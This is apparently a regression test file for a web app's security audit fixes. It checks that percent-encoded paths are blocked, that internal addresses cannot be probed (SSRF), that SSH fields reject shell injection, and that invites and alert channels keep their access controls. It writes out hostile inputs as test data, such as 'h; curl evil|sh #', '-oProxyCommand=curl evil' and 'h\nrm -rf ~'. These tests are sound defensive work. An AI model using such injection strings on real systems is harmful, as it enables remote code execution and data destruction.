import assert from 'node:assert/strict';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { test } from 'node:test';
import { and, eq } from 'drizzle-orm';
import { app, db, join, makeUser, schema } from './helpers.js';

const { config } = await import('../src/server/config.js');
const { httpProbe } = await import('../src/server/monitor/probes.js');

// Сценарии из аудита безопасности 08.10.2026: каждый тест — атака, которая раньше проходила

const alice = await makeUser('Alice');

// ── Проверка входа ──

test('%-кодированный путь не обходит проверку входа', async () => {
  for (const url of ['/%61pi/tools/resolve?host=localhost', '/%61pi/settings', '/api/%73ettings', '/%61pi/servers']) {
    assert.equal((await app.inject({ method: 'GET', url })).statusCode, 401, url);
  }
  const nullOrigin = await app.inject({ method: 'POST', url: '/api/auth/login', headers: { origin: 'null' }, payload: {} });
  assert.equal(nullOrigin.statusCode, 403, 'Origin: null — чужой, а не 500');
});

test('к пользователю с email, но без пароля, «паролем заглушки» не войти', async () => {
  db.insert(schema.users).values({ email: 'nopass@test.local', name: 'NoPass' }).run();
  for (const password of ['dummy-password', '']) {
    const res = await app.inject({ method: 'POST', url: '/api/auth/login', payload: { email: 'nopass@test.local', password }, remoteAddress: '203.0.113.9' });
    assert.equal(res.statusCode, 401);
  }
});

// ── Мониторинг не ходит во внутреннюю сеть ──

test('проверки серверов и сайтов не ходят на внутренние адреса', async () => {
  for (const ip of ['127.0.0.1', '10.0.0.3', '169.254.169.254', '::1', '::ffff:127.0.0.1']) {
    const s = await alice.req('POST', '/api/servers', { name: `in-${ip}`, ip, monitorPort: 6379 });
    assert.equal(s.status, 200, ip);
    const run = await alice.req('POST', `/api/monitor/server/${s.body.id}/run`);
    assert.match(run.body.lastError, /внутренний адрес/, ip);
  }
  const named = await alice.req('POST', '/api/servers', { name: 'by-name', hostname: 'localhost', monitorPort: 22 });
  assert.match((await alice.req('POST', `/api/monitor/server/${named.body.id}/run`)).body.lastError, /внутренний адрес/);

  for (const url of ['http://127.0.0.1:8001/v1/models', 'http://2130706433:6379/', 'http://[::1]:8090/', 'http://localhost:8000/']) {
    const site = await alice.req('POST', '/api/sites', { name: url, url, keyword: 'model' });
    assert.equal(site.status, 200, url);
    const run = await alice.req('POST', `/api/monitor/site/${site.body.id}/run`);
    assert.match(run.body.lastError, /внутренний адрес/, url);
    assert.equal(run.body.lastHttpStatus, null, 'статус внутренней страницы не виден');
  }
});

test('внешние адреса проверять можно', async () => {
  const { isForbiddenAddress, resolveTarget } = await import('../src/server/monitor/netguard.js');
  for (const ip of ['8.8.8.8', '1.1.1.1', '85.95.149.218', '203.0.114.1', '2001:4860:4860::8888', '2a00:1450:4010::1', '::ffff:8.8.8.8']) {
    assert.equal(isForbiddenAddress(ip), false, ip);
  }
  for (const ip of ['127.0.0.1', '10.0.0.1', '192.168.1.1', '172.16.5.5', '169.254.169.254', '100.64.0.1', '::1', 'fd00::1', 'fe80::1', '::ffff:127.0.0.1', '::ffff:7f00:1', '::ffff:192.168.0.1']) {
    assert.equal(isForbiddenAddress(ip), true, ip);
  }
  // Внешний IP проходит до подключения (без сети: литерал не резолвится)
  assert.deepEqual(await resolveTarget('203.0.114.1'), { address: '203.0.114.1', family: 4 });
  assert.deepEqual(await resolveTarget('[2001:4860:4860::8888]'), { address: '2001:4860:4860::8888', family: 6 });
});

test('resolve: только с правом правки и без внутренних адресов', async () => {
  const res = await alice.req('GET', '/api/tools/resolve?host=localhost');
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.addresses, []);
  const gus = await makeUser('Gus');
  await join(alice, gus, { infraAccess: 'view' });
  assert.equal((await gus.req('GET', '/api/tools/resolve?host=example.com', undefined, alice.workspaceId)).status, 403);
});

test('HTTP-проверка: редиректы по шагам, лимит шагов и размера, только http(s)', async () => {
  const big = 'x'.repeat(2 * 1024 * 1024);
  const server = http.createServer((req, res) => {
    if (req.url === '/hop') return res.writeHead(302, { location: '/final' }).end();
    if (req.url === '/final') return res.end('<html>marker</html>');
    if (req.url === '/loop') return res.writeHead(302, { location: '/loop' }).end();
    if (req.url === '/js') return res.writeHead(302, { location: 'javascript:alert(1)' }).end();
    if (req.url === '/big') return res.end(`${big}marker`);
    if (req.url === '/drip') {
      // По байту раз в 100 мс: простоя нет, но ответ не кончается
      res.writeHead(200);
      const drip = setInterval(() => res.write('x'), 100);
      return res.on('close', () => clearInterval(drip));
    }
    res.writeHead(404).end();
  });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  config.monitor.allowPrivate = true; // локальный тестовый сервер; запрет проверен выше
  try {
    assert.equal((await httpProbe(`${base}/hop`, 'marker')).ok, true);
    assert.match((await httpProbe(`${base}/loop`, null)).message ?? '', /перенаправлений/);
    assert.match((await httpProbe(`${base}/js`, null)).message ?? '', /не на http/);
    assert.match((await httpProbe(`${base}/big`, 'marker')).message ?? '', /нет текста/, 'ищем только в первом мегабайте');
    const started = Date.now();
    assert.match((await httpProbe(`${base}/drip`, 'marker', 500)).message ?? '', /Нет ответа за 0.5 с/);
    assert.ok(Date.now() - started < 2000, 'медленный ответ обрывается по общему сроку');
  } finally {
    config.monitor.allowPrivate = false;
    server.closeAllConnections();
    server.close();
  }
  assert.match((await httpProbe(`${base}/final`, 'marker')).message ?? '', /внутренний адрес/);
});

// ── Команда ssh для копирования ──

test('из адреса и логина SSH нельзя собрать команду оболочки', async () => {
  const srv = (await alice.req('POST', '/api/servers', { name: 'ssh-box', ip: '203.0.113.5' })).body;
  const cred = (fields: object) => alice.req('POST', '/api/credentials', { entityType: 'server', entityId: srv.id, kind: 'ssh', ...fields });
  for (const address of ['h; curl evil|sh #', '-oProxyCommand=curl evil', 'a b', 'h\nrm -rf ~', '$(id)']) {
    assert.equal((await cred({ address, username: 'root' })).status, 400, JSON.stringify(address));
  }
  for (const username of ['$(id)', '-oProxyCommand=x', 'ro ot', 'a;b']) {
    assert.equal((await cred({ address: 'example.com', username })).status, 400, username);
  }
  const ok = await cred({ address: 'srv.example.com', username: 'deploy.user' });
  assert.equal(ok.status, 200);
  assert.equal((await alice.req('PATCH', `/api/credentials/${ok.body.id}`, { address: 'x; id' })).status, 400, 'и при правке');
  // Остальные виды доступов — как раньше: адрес панели — ссылка
  const panel = await alice.req('POST', '/api/credentials', { entityType: 'server', entityId: srv.id, kind: 'panel', address: 'https://cp.example.com/login?a=1' });
  assert.equal(panel.status, 200);

  // Запасной хост команды — IP и hostname сервера
  assert.equal((await alice.req('POST', '/api/servers', { name: 'bad-ip', ip: '1.2.3.4; curl evil|sh #' })).status, 400);
  assert.equal((await alice.req('POST', '/api/servers', { name: 'bad-host', hostname: '-oProxyCommand=x' })).status, 400);
  assert.equal((await alice.req('POST', '/api/servers', { name: 'good', ip: '2001:db8::1', hostname: 'srv1.example.com' })).status, 200);
});

// ── Приглашения ──

test('приглашение не переживает удаления или понижения создателя', async () => {
  const bob = await makeUser('Bob');
  await join(alice, bob, { infraAccess: 'edit' });
  const bobMember = (await alice.req('GET', '/api/members')).body.find((m: { userId: number }) => m.userId === bob.userId);
  // Владелец делает Боба управляющим, Боб заготавливает себе ссылку «на чёрный день»
  assert.equal((await alice.req('PATCH', `/api/members/${bobMember.id}`, { infraAccess: 'edit', canManageMembers: true })).status, 200);
  const spare = (await bob.req('POST', '/api/invites', { infraAccess: 'edit' }, alice.workspaceId)).body.token;
  assert.equal((await bob.req('POST', '/api/invites/preview', { token: spare })).status, 200);

  assert.equal((await alice.req('DELETE', `/api/members/${bobMember.id}`)).status, 200);
  assert.equal((await bob.req('POST', '/api/invites/accept', { token: spare })).status, 404, 'удалённый не возвращается по своей ссылке');

  // Понижение: ссылки, выданные под прежние права, перестают действовать
  await join(alice, bob, { infraAccess: 'edit', canManageMembers: false });
  const again = (await alice.req('GET', '/api/members')).body.find((m: { userId: number }) => m.userId === bob.userId);
  await alice.req('PATCH', `/api/members/${again.id}`, { infraAccess: 'edit', canManageMembers: true });
  const kept = (await bob.req('POST', '/api/invites', { infraAccess: 'edit' }, alice.workspaceId)).body.token;
  await alice.req('PATCH', `/api/members/${again.id}`, { infraAccess: 'view', canManageMembers: true });
  assert.equal((await alice.req('POST', '/api/invites/preview', { token: kept })).status, 404);
});

// ── Каналы оповещений ──

test('канал с чужими темами не переподключить и не удалить', async () => {
  const channel = await alice.req('POST', '/api/channels', {
    kind: 'telegram_bot',
    name: 'Инфра',
    secret: '123456789:AAEabcdefghijklmnopqrstuvwxyz012345',
    target: '-1001234567890',
    topics: ['infra.status', 'infra.deadline'],
  });
  assert.equal(channel.status, 200);

  const carol = await makeUser('Carol');
  await join(alice, carol, { infraAccess: 'none', modules: { demo: 'manage' } });
  const seen = await carol.req('GET', '/api/notifications', undefined, alice.workspaceId);
  assert.equal(seen.body.channels.length, 0, 'канал с темами инфраструктуры ей не виден');
  const hijack = await carol.req('PATCH', `/api/channels/${channel.body.id}`, { target: '@attacker_channel' }, alice.workspaceId);
  assert.equal(hijack.status, 403);
  assert.equal((await carol.req('DELETE', `/api/channels/${channel.body.id}`, undefined, alice.workspaceId)).status, 403);

  const mike = await makeUser('Mike');
  await join(alice, mike, { infraAccess: 'none' });
  const mikeMember = (await alice.req('GET', '/api/members')).body.find((m: { userId: number }) => m.userId === mike.userId);
  await alice.req('PATCH', `/api/members/${mikeMember.id}`, { infraAccess: 'none', canManageMembers: true });
  assert.equal((await mike.req('DELETE', `/api/channels/${channel.body.id}`, undefined, alice.workspaceId)).status, 403, 'управлять участниками ≠ каналами');

  // Тест-кнопка ограничена: ею не забить общую очередь ботов
  const statuses: number[] = [];
  for (let i = 0; i < 7; i++) statuses.push((await alice.req('POST', `/api/channels/${channel.body.id}/test`)).status);
  assert.deepEqual(statuses.slice(0, 5), [200, 200, 200, 200, 200]);
  assert.equal(statuses[6], 429);
});

test('счётчик очереди — только своего пространства', async () => {
  const dan = await makeUser('Dan');
  const other = await dan.req('POST', '/api/channels', {
    kind: 'discord_webhook',
    name: 'Dan',
    secret: 'https://discord.com/api/webhooks/123456789/abcdefghij',
    topics: ['infra.status'],
  });
  for (let i = 0; i < 3; i++) await dan.req('POST', `/api/channels/${other.body.id}/test`);
  const mine = await alice.req('GET', '/api/notifications');
  assert.equal(mine.body.queue.discordPending, 0, 'чужие сообщения в очереди не видны');
  assert.equal((await dan.req('GET', '/api/notifications')).body.queue.discordPending, 3);
});

test('события модуля на дашборде — только с доступом к модулю, удалённого модуля — никому', async () => {
  db.insert(schema.events)
    .values([
      { workspaceId: alice.workspaceId, entityType: 'demo_thing', entityId: 1, kind: 'made', message: 'Событие демо' },
      { workspaceId: alice.workspaceId, entityType: 'eve_corp', entityId: 1, kind: 'notif_attack', message: 'Astrahus атакован' },
      { workspaceId: alice.workspaceId, entityType: 'server', entityId: 1, kind: 'down', message: 'Сервер упал' },
    ])
    .run();
  const viewer = await makeUser('Vic');
  await join(alice, viewer, { infraAccess: 'view' });
  const messages = async (u: typeof alice, ws?: number) =>
    ((await u.req('GET', '/api/dashboard', undefined, ws)).body.events as { message: string }[]).map((e) => e.message);
  const seen = await messages(viewer, alice.workspaceId);
  assert.ok(seen.includes('Сервер упал'));
  assert.ok(!seen.includes('Событие демо'), 'без доступа к модулю');
  const own = await messages(alice);
  assert.ok(own.includes('Событие демо'));
  // Модуля EVE (удалён) в этой сборке нет: его события не видны даже владельцу
  assert.ok(!own.includes('Astrahus атакован'));
});

test('SSL-проверка: медленное рукопожатие обрывается по общему сроку', async () => {
  const net = await import('node:net');
  const { sslProbe } = await import('../src/server/monitor/probes.js');
  // Заголовок записи TLS на 16 КБ, а потом по байту раз в 100 мс. Байты рукопожатия не сбрасывают
  // тайм-аут TLS-сокета (в отличие от HTTP-ответа, см. /drip), поэтому хватает socket.setTimeout
  const server = net.createServer((socket) => {
    socket.write(Buffer.from([0x16, 0x03, 0x03, 0x40, 0x00]));
    const drip = setInterval(() => socket.write(Buffer.from([0])), 100);
    socket.on('close', () => clearInterval(drip));
    socket.on('error', () => {});
  });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  config.monitor.allowPrivate = true;
  const started = Date.now();
  try {
    await assert.rejects(sslProbe('127.0.0.1', (server.address() as AddressInfo).port, 500), /Таймаут TLS/);
    assert.ok(Date.now() - started < 2000);
  } finally {
    config.monitor.allowPrivate = false;
    server.close();
  }
});

test('молчащий DNS: поиск адреса обрывается по своему сроку, а не по системному резолверу', async () => {
  const dgram = await import('node:dgram');
  const { resolveTarget, resolver } = await import('../src/server/monitor/netguard.js');
  const silent = dgram.createSocket('udp4'); // принимает запросы и не отвечает
  await new Promise<void>((r) => silent.bind(0, '127.0.0.1', r));
  const saved = resolver.getServers();
  resolver.setServers([`127.0.0.1:${silent.address().port}`]);
  const started = Date.now();
  try {
    await assert.rejects(resolveTarget('slow.example.com'), /Не удалось найти адрес/);
    assert.ok(Date.now() - started < 10_000, `${Date.now() - started} мс`);
  } finally {
    resolver.setServers(saved);
    silent.close();
  }
});
